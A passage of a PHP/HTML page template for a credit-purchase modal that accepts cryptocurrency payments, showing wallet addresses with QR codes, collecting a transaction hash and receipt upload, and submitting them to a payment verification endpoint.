              <svg viewBox="0 0 32 32" width="22" height="22"><circle cx="16" cy="16" r="16" fill="#1a1a2e"/><defs><linearGradient id="sg" x1="0%" y1="100%" x2="100%" y2="0%"><stop offset="0%" stop-color="#9945ff"/><stop offset="100%" stop-color="#14f195"/></linearGradient></defs><path d="M9 20.5h13l-2.5 2.5H9l2.5-2.5zm0-5.5h13l-2.5 2.5H9L11.5 15zm2.5-5.5h10.5L9.5 12H9l2.5-2.5z" fill="url(#sg)"/></svg>
            </span>
            <span class="cn">Solana</span>
            <span class="ct">SOL</span>
          </button>

        </div>

        <!-- Wallet box: address + QR -->
        <div class="wallet-box" id="wallet-box">
          <div class="wallet-top">
            <span class="wallet-label" id="w-label">Send to this address</span>
            <span class="wallet-badge" id="w-badge" style="background:rgba(38,161,123,.15);color:#26a17b">TRC-20</span>
          </div>
          <div style="display:flex;gap:.85rem;align-items:flex-start">
            <div style="flex:1">
              <div class="wallet-addr" id="w-addr" title="Click to select">â€”</div>
              <div id="w-empty-msg" style="display:none;font-size:.7rem;color:#f59e0b;margin-top:.4rem">
                âš  Admin has not set this wallet address yet.
              </div>
              <button class="copy-btn" onclick="copyAddr()" id="copy-btn-main">📋 Copy Address</button>
            </div>
            <div id="qr-wrap" style="flex-shrink:0;width:80px;height:80px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:10px;overflow:hidden;display:flex;align-items:center;justify-content:center">
              <img id="qr-img" src="" alt="QR" style="width:80px;height:80px;display:none;border-radius:8px"/>
              <span id="qr-placeholder" style="font-size:1.4rem;opacity:.3">â¬›</span>
            </div>
          </div>
        </div>

        <!-- Network warning -->
        <div class="net-warn">
          <span id="w-warn">Send USDT only on the <strong>TRC-20 (Tron)</strong> network. Wrong network = lost funds.</span>
        </div>

        <!-- TX Hash -->
        <label class="f-label">Transaction Hash / TX ID <span style="color:#ef4444">*</span></label>
        <input class="f-input" id="m-txhash" type="text" placeholder="Paste your transaction hash after sending..."/>

        <label class="f-label">Note (optional)</label>
        <textarea class="f-textarea" id="m-note" placeholder="Any additional info..."></textarea>

        <!-- Payment Receipt Upload -->
        <label class="f-label">Payment Receipt / Screenshot <span style="color:#ef4444">*</span> <span style="color:#6b7280;font-size:.62rem">(required)</span></label>
        <div id="receipt-drop" onclick="document.getElementById('m-receipt').click()" style="border:1.5px dashed rgba(0,240,255,.25);border-radius:10px;padding:1rem;text-align:center;cursor:pointer;transition:all .2s;background:rgba(0,240,255,.02);margin-bottom:.1rem">
          <div id="receipt-placeholder" style="pointer-events:none">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="rgba(0,240,255,.5)" stroke-width="1.5" style="margin-bottom:.4rem"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
            <div style="font-size:.72rem;color:rgba(0,240,255,.6)">Click to upload screenshot</div>
            <div style="font-size:.62rem;color:var(--muted);margin-top:.2rem">JPG, PNG, WEBP” max 5MB</div>
          </div>
          <div id="receipt-preview" style="display:none">
            <img id="receipt-img" style="max-height:120px;max-width:100%;border-radius:6px;object-fit:contain" src="" alt="Receipt"/>
            <div id="receipt-name" style="font-size:.65rem;color:#10b981;margin-top:.4rem"></div>
          </div>
        </div>
        <input type="file" id="m-receipt" accept="image/*" style="display:none" onchange="previewReceipt(this)"/>


        <button class="btn-submit" id="m-submit" onclick="submitReq()">Confirm Payment &amp; Submit â†’</button>
      </div>

      <!-- Verifying spinner -->
      <div id="m-verifying" style="display:none;text-align:center;padding:2.5rem 1rem">
        <div style="width:48px;height:48px;border:3px solid rgba(0,240,255,.12);border-top-color:#00f0ff;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 1.2rem"></div>
        <div style="font-family:'Orbitron',monospace;font-size:.85rem;color:#00f0ff;margin-bottom:.5rem">Verifying Payment...</div>
        <div style="font-size:.75rem;color:var(--muted)">Checking blockchain. Please wait a moment.</div>
      </div>
      <!-- Auto-verified success -->
      <div class="success-state" id="m-success-auto" style="display:none">
        <div class="s-circle" style="font-size:2.5rem">&#x2705;</div>
        <div class="s-title" style="color:#10b981">Payment Verified!</div>
        <div class="s-sub">USDT payment confirmed on blockchain.<br><strong id="s-credits-added" style="color:#00f0ff;font-size:1.1rem"></strong> added to your account instantly!</div>
        <div class="s-email" style="color:#10b981;margin-top:1rem">&#x2714; Credits updated automatically</div>
      </div>
      <!-- Manual review success -->
      <div class="success-state" id="m-success-manual" style="display:none">
        <div class="s-circle" style="font-size:2.5rem">&#x23F3;</div>
        <div class="s-title">Request Submitted!</div>
        <div class="s-sub">Your payment request has been sent to admin for review.<br>Credits will be added within <strong style="color:#10b981">24 hours</strong> after verification.</div>
        <div class="s-email"><?= $_userEmail ?></div>
      </div>
      <!-- Error state -->
      <div id="m-error" style="display:none;background:rgba(239,68,68,.07);border:1px solid rgba(239,68,68,.25);border-radius:12px;padding:1.2rem;margin-top:1rem">
        <div style="display:flex;align-items:flex-start;gap:.6rem">
          <span style="color:#ef4444;font-size:1.1rem;flex-shrink:0">&#x26A0;</span>
          <div>
            <div style="color:#ef4444;font-weight:600;font-size:.82rem;margin-bottom:.3rem">Verification Failed</div>
            <div id="m-error-msg" style="font-size:.78rem;color:rgba(255,255,255,.65);line-height:1.5"></div>
          </div>
        </div>
        <button onclick="retrySubmit()" style="margin-top:.9rem;width:100%;padding:.5rem;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:8px;color:#ef4444;font-size:.75rem;cursor:pointer">Try Again</button>
      </div>
    </div>
  </div>
</div>

<script>
// Wallet addresses loaded from admin DB via PHP
const WALLETS = {
  usdt_trc20: {
    name:'USDT (TRC-20)', addr:<?= json_encode($_wallets['usdt_trc20']) ?>,
    badge:'TRC-20', badgeColor:'#26a17b', badgeBg:'rgba(38,161,123,.15)',
    warn:'Send <strong>USDT</strong> only on the <strong>TRC-20 (Tron)</strong> network. Wrong network = lost funds.'
  },
  usdt_erc20: {
    name:'USDT (ERC-20)', addr:<?= json_encode($_wallets['usdt_erc20']) ?>,
    badge:'ERC-20', badgeColor:'#627eea', badgeBg:'rgba(98,126,234,.15)',
    warn:'Send <strong>USDT</strong> only on the <strong>ERC-20 (Ethereum)</strong> network. Gas fees apply.'
  },
  btc: {
    name:'Bitcoin (BTC)', addr:<?= json_encode($_wallets['btc']) ?>,
    badge:'BTC', badgeColor:'#f7931a', badgeBg:'rgba(247,147,26,.15)',
    warn:'Send <strong>BTC</strong> on the <strong>Bitcoin</strong> network only. Min 1 confirmation required.'
  },
  eth: {
    name:'Ethereum (ETH)', addr:<?= json_encode($_wallets['eth']) ?>,
    badge:'ETH', badgeColor:'#627eea', badgeBg:'rgba(98,126,234,.15)',
    warn:'Send <strong>ETH</strong> on <strong>Ethereum Mainnet</strong> only. Gas fees apply.'
  },
  bnb: {
    name:'BNB (BEP-20)', addr:<?= json_encode($_wallets['bnb']) ?>,
    badge:'BEP-20', badgeColor:'#f3ba2f', badgeBg:'rgba(243,186,47,.15)',
    warn:'Send <strong>BNB</strong> on the <strong>BNB Smart Chain (BEP-20)</strong> network only.'
  },
  ltc: {
    name:'Litecoin (LTC)', addr:<?= json_encode($_wallets['ltc']) ?>,
    badge:'LTC', badgeColor:'#a5a9b8', badgeBg:'rgba(165,169,184,.15)',
    warn:'Send <strong>LTC</strong> on the <strong>Litecoin</strong> network only.'
  },
  sol: {
    name:'Solana (SOL)', addr:<?= json_encode($_wallets['sol']) ?>,
    badge:'SOL', badgeColor:'#9945ff', badgeBg:'rgba(153,69,255,.15)',
    warn:'Send <strong>SOL</strong> on the <strong>Solana</strong> network only. Do not use wrapped SOL.'
  },
};

let _plan={}, _crypto='usdt_trc20';

function _showState(s){
  ['m-form','m-verifying','m-success-auto','m-success-manual'].forEach(function(id){
    var el=document.getElementById(id); if(el) el.style.display='none';
  });
  var map={form:'m-form',verifying:'m-verifying',auto:'m-success-auto',manual:'m-success-manual'};
  var t=document.getElementById(map[s]); if(t) t.style.display='block';
}

function retrySubmit(){
  document.getElementById('m-error').style.display='none';
  var btn=document.getElementById('m-submit');
  btn.disabled=false; btn.textContent='Confirm Payment \u0026 Submit \u2192';
}

function previewReceipt(input){
  const file = input.files[0];
  if(!file) return;
  if(file.size > 5*1024*1024){
    alert('File too large. Max 5MB.');
    input.value='';
    return;
  }
  const reader = new FileReader();
  reader.onload = function(e){
    document.getElementById('receipt-placeholder').style.display='none';
    document.getElementById('receipt-preview').style.display='block';
    document.getElementById('receipt-img').src = e.target.result;
    document.getElementById('receipt-name').textContent = '\u2714 ' + file.name;
  };
  reader.readAsDataURL(file);
}


function openModal(id,name,credits,usd,lkr,amtUsd){
  _plan={id:id,name:name,credits:credits,usd:usd,lkr:lkr,amtUsd:parseFloat(amtUsd)||0};
  document.getElementById('m-title').textContent='Purchase '+name;
  document.getElementById('m-plan-name').textContent=name+' \u2014 '+credits+' Credits';
  document.getElementById('m-plan-price').textContent=usd+' / '+lkr;
  _showState('form');
  var errEl=document.getElementById('m-error'); if(errEl) errEl.style.display='none';
  document.getElementById('m-submit').disabled=false;
  document.getElementById('m-submit').textContent='Confirm Payment \u0026 Submit \u2192';
  document.getElementById('m-txhash').value='';
  document.getElementById('m-note').value='';
  // Reset receipt
  var rFile=document.getElementById('m-receipt'); if(rFile) rFile.value='';
  var rPh=document.getElementById('receipt-placeholder'); if(rPh) rPh.style.display='block';
  var rPrev=document.getElementById('receipt-preview'); if(rPrev) rPrev.style.display='none';
  var rDrop=document.getElementById('receipt-drop'); if(rDrop) rDrop.style.borderColor='rgba(0,240,255,.25)';
  const firstBtn=document.querySelector('.crypto-btn');
  document.querySelectorAll('.crypto-btn').forEach(b=>b.classList.remove('active'));
  if(firstBtn) firstBtn.classList.add('active');
  selCrypto(firstBtn,'usdt_trc20');
  document.getElementById('modal-ov').classList.add('open');
}
function closeModal(){document.getElementById('modal-ov').classList.remove('open')}

function selCrypto(el, key){
  _crypto = key;
  document.querySelectorAll('.crypto-btn').forEach(b=>b.classList.remove('active'));
  if(el) el.classList.add('active');
  const w = WALLETS[key];
  const addr = w.addr || '';

  document.getElementById('w-badge').textContent = w.badge;
  document.getElementById('w-badge').style.color = w.badgeColor;
  document.getElementById('w-badge').style.background = w.badgeBg;

  const addrEl = document.getElementById('w-addr');
  const emptyMsg = document.getElementById('w-empty-msg');
  const copyBtn = document.getElementById('copy-btn-main');
  if(addr){
    addrEl.textContent = addr; addrEl.style.opacity = '1';
    emptyMsg.style.display = 'none'; copyBtn.style.display = 'block';
    const qrImg = document.getElementById('qr-img');
    const qrPh  = document.getElementById('qr-placeholder');
    qrImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=160x160&margin=8&data='+encodeURIComponent(addr);
    qrImg.style.display = 'block'; qrPh.style.display = 'none';
  } else {
    addrEl.textContent = 'Not configured'; addrEl.style.opacity = '.35';
    emptyMsg.style.display = 'block'; copyBtn.style.display = 'none';
    document.getElementById('qr-img').style.display = 'none';
    document.getElementById('qr-placeholder').style.display = 'flex';
  }
  document.getElementById('w-warn').innerHTML = w.warn;
}

function copyAddr(){
  const addr = WALLETS[_crypto].addr;
  if(!addr) return;
  navigator.clipboard.writeText(addr).then(()=>{
    const btn = document.getElementById('copy-btn-main');
    btn.textContent = '\u2713 Copied!';
    btn.style.color = '#10b981';
    btn.style.borderColor = 'rgba(16,185,129,.3)';
    setTimeout(()=>{ btn.textContent='\uD83D\uDCCB Copy Address'; btn.style.color=''; btn.style.borderColor=''; },2500);
  }).catch(()=>{
    const el = document.getElementById('w-addr');
    const r = document.createRange(); r.selectNode(el);
    window.getSelection().removeAllRanges(); window.getSelection().addRange(r);
  });
}

async function submitReq(){
  const txhash = document.getElementById('m-txhash').value.trim();
  if(!txhash){
    document.getElementById('m-txhash').style.borderColor='rgba(239,68,68,.5)';
    document.getElementById('m-txhash').focus(); return;
  }
  // Validate receipt is uploaded (required)
  var receiptCheck=document.getElementById('m-receipt');
  if(!receiptCheck || !receiptCheck.files[0]){
    var rd=document.getElementById('receipt-drop');
    if(rd){
      rd.style.borderColor='rgba(239,68,68,.6)';
      rd.style.background='rgba(239,68,68,.05)';
      rd.scrollIntoView({behavior:'smooth',block:'center'});
      setTimeout(()=>{ rd.style.borderColor='rgba(0,240,255,.25)'; rd.style.background='rgba(0,240,255,.02)'; },3000);
    }
    return;
  }
  document.getElementById('m-txhash').style.borderColor='';
  var errEl=document.getElementById('m-error'); if(errEl) errEl.style.display='none';
  const btn=document.getElementById('m-submit');
  btn.disabled=true; btn.textContent='Verifying...';
  _showState('verifying');
  const w=WALLETS[_crypto];
  const fd=new FormData();
  fd.append('plan_id',   _plan.id);
  fd.append('plan_name', _plan.name);
  fd.append('credits',   _plan.credits);
  fd.append('crypto',    _crypto);
  fd.append('amount_usd',_plan.amtUsd);
  fd.append('txhash',    txhash);
  fd.append('name',      document.getElementById('m-name').value);
  fd.append('email',     document.getElementById('m-email').value);
  fd.append('note',      document.getElementById('m-note').value);
  var receiptInput=document.getElementById('m-receipt');
  if(receiptInput && receiptInput.files[0]) fd.append('receipt', receiptInput.files[0]);
  try{
    const res=await fetch('verify_payment.php',{method:'POST',body:fd,credentials:'include'});
    const json=await res.json();
    if(json.verified){
      document.getElementById('s-credits-added').textContent='+'+json.credits_added+' Credits';
      _showState('auto');
    } else if(json.manual){
      _showState('manual');
    } else {
      _showState('form');
      if(errEl){ errEl.style.display='block'; document.getElementById('m-error-msg').textContent=json.error||'Verification failed. Check your TX hash.'; }
      btn.disabled=false; btn.textContent='Confirm Payment \u0026 Submit \u2192';
    }
  }catch(e){
    _showState('form');
    if(errEl){ errEl.style.display='block'; document.getElementById('m-error-msg').textContent='Network error. Check your connection and try again.'; }
    btn.disabled=false; btn.textContent='Confirm Payment \u0026 Submit \u2192';
  }
}
</script>
</body>
</html>
